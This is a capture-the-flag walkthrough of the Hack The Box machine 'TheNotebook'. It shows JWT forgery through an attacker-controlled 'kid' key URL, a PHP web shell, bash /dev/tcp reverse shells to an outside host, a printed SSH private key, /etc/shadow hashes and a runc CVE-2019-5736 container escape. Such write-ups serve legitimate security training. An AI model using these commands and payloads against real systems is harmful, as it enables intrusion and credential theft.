# TheNoteBook

URL: https://app.hackthebox.com/machines/TheNotebook

Level: Medium

Date: 26 Apr 2024


## Initial scan

```bash
# Nmap 7.93 scan initiated Fri Apr 26 09:37:56 2024 as: nmap -T4 -n -p- -oA nmap 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10010/tcp filtered rxapi

# Nmap done at Fri Apr 26 09:38:38 2024 -- 1 IP address (1 host up) scanned in 41.44 seconds
```

```bash
# Nmap 7.93 scan initiated Fri Apr 26 09:42:28 2024 as: nmap -T4 -n -p80 -sC -sV -oA nmap2 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 26 09:42:36 2024 -- 1 IP address (1 host up) scanned in 8.06 seconds
```

As always, we skip the "ssh way" and we focus on web app.

## web app

If we try to create an account, while observing HTTP traffici within `BurpSuite`, we found that JSON Web Token are used here.

We noticed this payload:

`admin_cap: false`

We also notice that there is a reference to an external "repo" for private key

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
```

So, the path is clear: we need to forge a token with `admin_cap: true` and a *valid* signature. 

`kid` must point to a web server under our control.

## JWT

let's create keypair:

```bash
openssl genrsa -out ./private.key 4096
openssl rsa -in private.key -pubout -outform PEM -out public.key
```

We can use https://jwt.io/ to populate everything we need.

![](_attachments/Pasted%20image%2020240426115604.png)

Let's spawn a Python webserver on our port `7070/TCP`:

```bash
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
```

Of course we have file `private.key` in our document_root

Let's intercept and replace our token:

![](_attachments/Pasted%20image%2020240426120006.png)

Of course we receive connection from our target, which is calling us to valide our key!

```bash
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.10.10.230 - - [26/Apr/2024 11:57:42] "GET /private.key HTTP/1.1" 200 -
10.10.10.230 - - [26/Apr/2024 11:59:02] "GET /private.key HTTP/1.1" 200 -
10.10.10.230 - - [26/Apr/2024 11:59:26] "GET /private.key HTTP/1.1" 200 -
10.10.10.230 - - [26/Apr/2024 12:01:29] "GET /private.key HTTP/1.1" 200 -

```

While logged in as "admin", we get another function in top menu ("Admin Panel")

![](_attachments/Pasted%20image%2020240426120034.png)

We can display previous notes:

![](_attachments/Pasted%20image%2020240426120149.png)

![](_attachments/Pasted%20image%2020240426122058.png)

![](_attachments/Pasted%20image%2020240426122732.png)

We notice a reference to PHP :)

![](_attachments/Pasted%20image%2020240426122133.png)

This plugin sounds interesting:

![](_attachments/Pasted%20image%2020240426122328.png)

or we can simply use Firefox's plugin "cookie manager" to configure our forged JWT.

## reverse shell

Through the upload function, we transfer our simple PHP shell:


![](_attachments/Pasted%20image%2020240426121421.png)

We got code execution!

![](_attachments/Pasted%20image%2020240426123002.png)



`http://10.10.10.230/c214a2fb80bab315fc328a5eff2892b5.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.43/5000+0%3E%261%27`


```bash
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ nc -nvlp 5000
listening on [any] 5000 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.230] 58736
bash: cannot set terminal process group (1161): Inappropriate ioctl for device
bash: no job control in this shell
www-data@thenotebook:~/html$

```

```bash
www-data@thenotebook:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@thenotebook:~/html$
```

After a bit of local enumeration, we found `/var/backups`

```
www-data@thenotebook:/opt$ cd /var/
www-data@thenotebook:/var$ ls
backups  crash  local  log   opt  snap   tmp
cache    lib    lock   mail  run  spool  www
www-data@thenotebook:/var$ cd backups/
www-data@thenotebook:/var/backups$ ls
alternatives.tar.0        apt.extended_states.3.gz  group.bak    shadow.bak
apt.extended_states.0     dpkg.diversions.0         gshadow.bak
apt.extended_states.1.gz  dpkg.statoverride.0       home.tar.gz
apt.extended_states.2.gz  dpkg.status.0             passwd.bak

```

We noticed: `home.tar.gz`

This is archive's content:

```bash
www-data@thenotebook:/tmp$ tar xzvf home.tar.gz
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
```

So we have `noah` SSH keys:

```bash
www-data@thenotebook:/tmp$ cat home/noah/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKq5y/Po/8QRBt1/xwDjgaQSMJzdCcDKywQPeqr0/PUvEQ3TgduGEN8XEr4QNYrjKSTSDky8FByRzECzfWY2e75QKVgsxvhhca+uLAKu2sej+6XBOsvKapXPGMRstSQiCNk1bj0AHCLakN/OheeKP0kryzeKMij7D/RGofMB+BLdju35sdWjiS8gdPQhe94CK/F7PdSmK6UWRpDjOTfut8c7fC5NazJnS+YvuCvd9BEGd2tQO/iTbPB63Fg23SGN0sPID4oZYUV5bt7L3KeswpbaJza8G5wQBRR76ZvQRrM7aKeFetMBASBOts7uM2hkSl/gwNG3sNNDt1HP6Twcbj noah@thenotebook
```



```bash
www-data@thenotebook:/tmp$ cat home/noah/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
```

## user flag

```bash
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ ssh -i noah.key noah@10.10.10.230
The authenticity of host '10.10.10.230 (10.10.10.230)' can't be established.
ED25519 key fingerprint is SHA256:fOnUQpDXHxBBrxrhpbLACjAaAGiofGEfJ4/HX6ljFhg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.230' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 26 10:48:22 UTC 2024

  System load:  0.01              Processes:              183
  Usage of /:   46.2% of 7.81GB   Users logged in:        0
  Memory usage: 14%               IP address for ens160:  10.10.10.230
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

137 packages can be updated.
75 updates are security updates.


Last login: Wed Feb 24 09:09:34 2021 from 10.10.14.5
noah@thenotebook:~$
```

We can grab user flag here.

## privesc

We know the `noah` can use `docker exec` as root, without password:

```bash
noah@thenotebook:/var/backups$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```


Maybe we can try to use this exploit `CVE-2019-5736`

This exploit basically overwrites `runc` binary.

This is the legit one:

```bash
noah@thenotebook:~$ which runc
/usr/sbin/runc
noah@thenotebook:~$ md5sum /usr/sbin/runc
94b7fed4045e453722bbdc106cba6695  /usr/sbin/runc
```



https://github.com/Frichetten/CVE-2019-5736-PoC

```bash
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
Cloning into 'CVE-2019-5736-PoC'...
remote: Enumerating objects: 53, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 53 (delta 1), reused 5 (delta 1), pack-reused 45
Receiving objects: 100% (53/53), 1.69 MiB | 7.01 MiB/s, done.
Resolving deltas: 100% (11/11), done.
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ cd CVE-2019-5736-PoC/
joshua@kaligra:~/Documents/htb/machines/TheNotebook/CVE-2019-5736-PoC$ ls
main.go  README.md  screenshots
joshua@kaligra:~/Documents/htb/machines/TheNotebook/CVE-2019-5736-PoC$ go build main.go
joshua@kaligra:~/Documents/htb/machines/TheNotebook/CVE-2019-5736-PoC$ ls -l
total 2080
-rwxr-xr-x 1 joshua joshua 2110616 Apr 26 13:18 main
-rw-r--r-- 1 joshua joshua    2274 Apr 26 13:17 main.go
-rw-r--r-- 1 joshua joshua    4811 Apr 26 13:17 README.md
drwxr-xr-x 2 joshua joshua    4096 Apr 26 13:17 screenshots
joshua@kaligra:~/Documents/htb/machines/TheNotebook/CVE-2019-5736-PoC$
```

The default payload creates a copy of `/etc/shadow` in `/tmp` folder.

The import thing here is: we need to run THIS command:

`sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh`


while on the first shell we see "Overwritten `/bin/bash`"...

```bash
root@a971cc0d34e0:/opt/webapp# wget http://172.17.0.1:8888/main
--2024-04-26 11:22:09--  http://172.17.0.1:8888/main
Connecting to 172.17.0.1:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2110616 (2.0M) [application/octet-stream]
Saving to: ‘main’

main                                            100%[=====================================================================================================>]   2.01M  --.-KB/s    in 0.006s

2024-04-26 11:22:09 (318 MB/s) - ‘main’ saved [2110616/2110616]

root@a971cc0d34e0:/opt/webapp# ls
__pycache__  admin  create_db.py  main  main.py  privKey.key  requirements.txt  static  templates  webapp.tar.gz
root@a971cc0d34e0:/opt/webapp# chmod +x main
root@a971cc0d34e0:/opt/webapp# ./main
[+] Overwritten /bin/sh successfully <<==== NOW YOU SHOULD RUN DOCKER WITH SUDO

[+] Found the PID: 119
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc00042b380}
[+] The command executed is#!/bin/bash

root@a971cc0d34e0:/opt/webapp#
root@a971cc0d34e0:/opt/webapp#

```


On first shell:

```bash
$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
No help topic for '/bin/sh'
```

And of course we get a copy of `shadow`

```bash
noah@thenotebook:~$ cat /tmp/shadow
root:$6$OZ7vREXE$yXjcCfK6rhgAfN5oLisMiB8rE/uoZb7hSqTOYCUTF8lNPXgEiHi7zduz1mrTWtFnhKOCZA9XZu12osORyYnKF.:18670:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18670:0:99999:7:::
noah:$6$fOy3f6Dp$i9.Ut7PlJpP19ZPTqmkmiRwqNunLqNEjNwq1iIeffXGi6OaDy8CtAEXXJf2SkO2fiZxuy.tWuWhsmyvl92L/W.:18670:0:99999:7:::
```

We can try to crack with `John The Ripper`

```bash
joshua@kaligra:~/Documents/htb/machines/TheNotebook$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:41 0.14% (ETA: 01:55:12) 0g/s 602.0p/s 1204c/s 1204C/s rosanegra..green07
..
..
```

Meanwhile, we can use a different payload, for example with a reverse bash shell:

```bash
func main() {
        // This is the line of shell commands that will execute on the host
        var payload = "#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.43/5555 0>&1
```


We upload this new binary (`main-reverse`) on target.

We enter in the container `webapp-dev01`:

`sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash`

Within the container, we transfer our malicious go binary `main-reverse` 

```bash
root@8eeb30b468ae:~# wget http://172.17.0.1:8888/main-reverse                                  │Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet conne
--2024-04-26 16:04:45--  http://172.17.0.1:8888/main-reverse                                   │ction or proxy settings
Connecting to 172.17.0.1:8888... connected.                                                    │
HTTP request sent, awaiting response... 200 OK                                                 │
Length: 2110608 (2.0M) [application/octet-stream]                                              │Last login: Fri Apr 26 15:40:20 2024 from 10.10.14.43
Saving to: ‘main-reverse’               
```


We spawn a `netcat` listener...

```bash
joshua@kaligra:~$ nc -nvlp 5555
listening on [any] 5555 ...
```

On the other shell, as user `noah`, we are ready with the command:

`sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh`

**ATTENTION: not /bin/bash, but /bin/sh **

Within the container:

```bash
root@8eeb30b468ae:~# chmod +x main-reverse
root@8eeb30b468ae:~# ./main-reverse
[+] Overwritten /bin/sh successfully
```

we run again our command

`sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh`


## root flag

...and we receive our root shell!

```bash
joshua@kaligra:~$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.230] 34756
bash: cannot set terminal process group (5696): Inappropriate ioctl for device
bash: no job control in this shell
<a8a374def0a71c9bde2bebb58ddd60e24aa5bd3324e685a32# id
id
uid=0(root) gid=0(root) groups=0(root)
root@thenotebook:/root# cat root.txt
cat root.txt
a228fdff4410748f7exxxxxxxxxxxxxxxxxxxxxxxxxx
```

